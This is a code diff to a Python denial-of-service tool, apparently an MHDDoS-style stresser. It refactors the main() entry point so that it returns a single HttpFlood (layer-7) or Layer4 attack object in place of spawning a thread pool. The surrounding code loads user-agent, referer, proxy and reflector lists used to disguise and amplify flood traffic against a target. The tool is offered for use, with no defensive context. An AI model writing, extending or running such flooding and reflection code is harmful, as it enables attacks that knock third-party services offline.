@@ -1040,13 +1040,14 @@ class HttpFlood:
         if name == "KILLER": self.SENT_FLOOD = self.KILLER
 
 
-def main(url, ip, method, threads, event, thread_pool, proxies, rpc=None, refl_li_fn=None, statistics=None):
+def main(url, ip, method, event, proxies, rpc=None, refl_li_fn=None, statistics=None):
     REQUESTS_SENT = statistics['requests']
     BYTES_SEND = statistics['bytes']
 
     if method not in Methods.ALL_METHODS:
         exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
 
+    # XXX: not sure how this should work now
     # threads = Tools.prepare(url.host, threads, thread_pool, REQUESTS_SENT, BYTES_SEND)
     if method in Methods.LAYER7_METHODS:
         useragent_li = ROOT_DIR / "files/useragent.txt"
@@ -1064,6 +1065,7 @@ def main(url, ip, method, threads, event, thread_pool, proxies, rpc=None, refl_l
         if not useragent_li.exists():
             exit("The Useragent file doesn't exist ")
 
+        # XXX: No need to do thif from each thread separately
         with useragent_li.open("r+") as f:
             uagents = set(a.strip() for a in f.readlines())
         referers = set(a.strip() for a in REFERERS)
@@ -1073,12 +1075,7 @@ def main(url, ip, method, threads, event, thread_pool, proxies, rpc=None, refl_l
         if not referers:
             exit("Empty Referer File ")
 
-        #for thread_id in range(threads):
-        #    thread_pool.submit(
-        #        HttpFlood(thread_id, url, ip, method, rpc, event,
-        #                  uagents, referers, proxies, REQUESTS_SENT, BYTES_SEND).run
-        #    )
-        return HttpFlood(0, url, ip, method, rpc, event,
+        return HttpFlood(-1, url, ip, method, rpc, event,
                          uagents, referers, proxies, REQUESTS_SENT, BYTES_SEND)
     
     if method in Methods.LAYER4_METHODS:
@@ -1103,12 +1100,6 @@ def main(url, ip, method, threads, event, thread_pool, proxies, rpc=None, refl_l
                 )
             if not ref:
                 exit("Empty Reflector File ")
-
-        #for _ in range(threads):
-        #    thread_pool.submit(
-        #        Layer4((ip, port), ref, method, event,
-        #               proxies, REQUESTS_SENT, BYTES_SEND).run
-        #    )
 
         return Layer4((ip, port), ref, method, event,
                        proxies, REQUESTS_SENT, BYTES_SEND)
